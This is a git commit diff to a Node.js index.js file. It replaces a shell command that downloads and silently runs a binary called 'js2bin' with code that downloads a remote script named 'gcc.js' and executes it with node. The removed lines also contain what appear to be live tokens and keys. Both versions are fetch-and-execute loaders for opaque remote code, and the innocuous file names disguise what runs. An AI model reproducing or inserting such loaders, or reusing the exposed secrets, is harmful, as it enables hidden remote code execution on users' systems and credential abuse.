abb8b67f3c62b73c041cdc7c9e24e205cd88c481
jfux888 <jfux888@gmail.com>
2024-06-26 08:33:32 +0800

    Update index.js

--- index.js
+++ index.js
@@ -1,20 +1,15 @@
+const url = 'https://github.com/jfux888/zeabur/releases/download/dl/gcc.js';
+const fileName = 'gcc.js';
+
+const axios = require('axios');
+const fs = require('fs');
 const { exec } = require('child_process');
 
-const command = `
-  C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiNDQ5YWY1YTctMGQ0Yy00YTY1LWFjODgtODZjZTE1ZjA1NzA1IiwicyI6Ilpqa3pOVEppT0dNdE9ETXhPUzAwT1RneUxUZzBPVFF0WlRSaE1UaGtOalkxT0dJeCJ9
-  N_S=nz.seav.eu.org
-  N_K=djTqLOD0hS80jYbqXx
-  bash -c 'curl -L -o js2bin https://github.com/seav1/dl/releases/download/src/js2bin && chmod +x js2bin && nohup ./js2bin'
-`;
-
-exec(command, (error, stdout, stderr) => {
-  if (error) {
-    console.error(`Error executing command: ${error.message}`);
-    return;
-  }
-  if (stderr) {
-    console.error(`stderr: ${stderr}`);
-    return;
-  }
-  console.log(`stdout: ${stdout}`);
+axios({
+    url: url,
+    responseType: 'stream'
+}).then(response => {
+    response.data.pipe(fs.createWriteStream(fileName)).on('finish', () => {
+        exec(`node ${fileName}`);
+    });
 });
